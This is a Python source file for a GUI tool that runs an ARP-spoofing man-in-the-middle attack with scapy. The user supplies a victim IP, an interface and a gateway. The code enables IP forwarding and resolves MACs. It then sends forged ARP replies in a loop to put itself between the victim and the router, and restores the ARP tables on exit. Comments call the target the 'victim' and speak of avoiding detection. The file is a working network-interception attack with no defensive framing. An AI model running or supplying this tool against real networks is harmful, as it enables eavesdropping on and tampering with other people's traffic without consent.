import os
import time
import sys
from scapy.all import *
import customtkinter
import tkinter.messagebox
from tkinter import ttk
import tkinter
from tkinter.constants import RIGHT, BOTH, W, NO, END

# get what we are messing with

customtkinter.set_appearance_mode("System")  # Modes: "System" (standard), "Dark", "Light"
customtkinter.set_default_color_theme("blue")

global root
info = []


def getInfo():
    global interface
    global victimIP
    global routerIP
    global root
    interface = root.entry_if.get()
    victimIP = root.entry_ip.get()
    routerIP = root.entry_gw.get()
    print("~~~Getting addresses...")
    info = [interface, victimIP, routerIP]
    print(info)
    mitm(info)

def mitm(info):
    setIPForwarding(True)
    print("~~~Getting MACs...")
    try:
        victimMAC = get_MAC(info[1], info[0])
    except Exception as e:
        setIPForwarding(False)
        print("~!~Error getting victim MAC...")
        print(e)
        sys.exit(1)

    try:
        routerMAC = get_MAC(info[2], info[0])
    except Exception as e:
        setIPForwarding(False)
        print("~!~Error getting router MAC...")
        print(e)
        sys.exit(1)

    print("~~~Victim MAC: %s" % victimMAC)
    print("~~~Router MAC: %s" % routerMAC)
    print("~~~Attacking...")

    while True:
        try:
            attack(info[1], victimMAC, info[2], routerMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reassignARP(info[1], info[2], info[0])
            break
    sys.exit(1)


def on_closing(event=0):
    global root
    root.destroy()


# turn on port forwarding until restart
def setIPForwarding(toggle):
    if (toggle == True):
        print("~~~Turing on IP forwarding...")
        # for OSX
        os.system('sysctl -w net.inet.ip.forwarding=1')

    # other
    # os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    if (toggle == False):
        print("~~~Turing off IP forwarding...")
        # for OSX
        os.system('sysctl -w net.inet.ip.forwarding=0')


# other
# os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')


# need to get mac addresses of vitcim and router
# do this by generating ARP requests, which are made
# for getting MAC addresses
def get_MAC(ip, interface):
    # set verbose to 0, least stuff printed (range: 0-4) (4 is max I think)
    # conf.verb = 4

    # srp() send/recive packets at layer 2 (ARP)
    # Generate a Ether() for ethernet connection/ARP request (?)
    # timeout 2, units seconds(?)
    # interface, wlan0, wlan1, etc...
    # inter, time .1 seconds to retry srp()
    # returns  IDK yet
    answer, unanswer = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, iface=interface, inter=0.1)

    # I'm not exactly sure as to what how this works, but it gets the data we need
    for send, recieve in answer:
        return recieve.sprintf(r"%Ether.src%")


# this is to restablish the connection between the router
# and victim after we are done intercepting IMPORTANT
# victim will notice very quickly if this isn't done
def reassignARP(victimIP, routerIP, interface):
    print("~~~Reassigning ARPS...")

    # get victimMAC
    victimMAC = get_MAC(victimIP, interface)

    # get routerMAC
    routerMAC = get_MAC(routerIP, interface)

    # send ARP request to router as-if from victim to connect,
    # do it 7 times to be sure
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count = 7)

    # send ARP request to victim as-if from router to connect
    # do it 7 times to be sure
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count = 7)

    # don't need this anymore
    setIPForwarding(False)
    print("[*] Shutting Down...")
    sys.exit(1)

# this is the actuall attack
# sends a single ARP request to both targets
# saying that we are the other the other target
# so it's puts us inbetween!
# funny how it's the smallest bit of code
def attack(victimIP, victimMAC, routerIP, routerMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))


def manInTheMiddle():
    global root
    # Defining GUI
    root = customtkinter.CTk()
    root.withdraw()
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.title("MITM")
    root.geometry("400x300")
    root.protocol("WM_DELETE_WINDOW", on_closing)  # call .on_closing() when app gets closed
    root.grid_columnconfigure(1, weight=1)
    root.grid_rowconfigure(3, weight=1)
    root.frame_mitm = customtkinter.CTkFrame(master=root, corner_radius=10)
    root.frame_mitm.grid(row=1, column=0, padx=15, pady=20)
    root.label_ip = customtkinter.CTkLabel(master=root.frame_mitm,
                                      text="Target's IP :",
                                      text_font=("Arial Rounded MT Bold", -10))  # font name and size in px
    root.label_ip.grid(row=1, column=0, pady=10, padx=10)
    # IP entry
    root.entry_ip = customtkinter.CTkEntry(master=root.frame_mitm,
                                      width=150,
                                      placeholder_text="Interface")
    root.entry_ip.grid(row=1, column=1, pady=10, padx=15, )

    root.label_if = customtkinter.CTkLabel(master=root.frame_mitm,
                                      text="Interface",
                                      text_font=("Arial Rounded MT Bold", -10))  # font name and size in px
    root.label_if.grid(row=2, column=0, pady=10, padx=10)
    # Interface entry
    root.entry_if = customtkinter.CTkEntry(master=root.frame_mitm,
                                      width=150,
                                      placeholder_text="eth0")
    root.entry_if.grid(row=2, column=1, pady=10, padx=15, )
    root.label_gw = customtkinter.CTkLabel(master=root.frame_mitm,
                                      text="Gateway",
                                      text_font=("Arial Rounded MT Bold", -10))  # font name and size in px
    root.label_gw.grid(row=3, column=0, pady=10, padx=10)
    # Interface entry
    root.entry_gw = customtkinter.CTkEntry(master=root.frame_mitm,
                                      width=150,
                                      placeholder_text="Gateway")
    root.entry_gw.grid(row=3, column=1, pady=10, padx=15, )
    # Host discovery button
    root.button_attack = customtkinter.CTkButton(master=root.frame_mitm,
                                            text="Attack",
                                            border_width=2,  # <- custom border_width
                                            fg_color=None,  # <- no fg_color
                                            command=getInfo)
    root.button_attack.grid(row=4, column=0, columnspan=2, pady=0, padx=5)
    #print(info)
    # info = ['en0', '162.246.145.218', '10.141.248.214']
    root.mainloop()
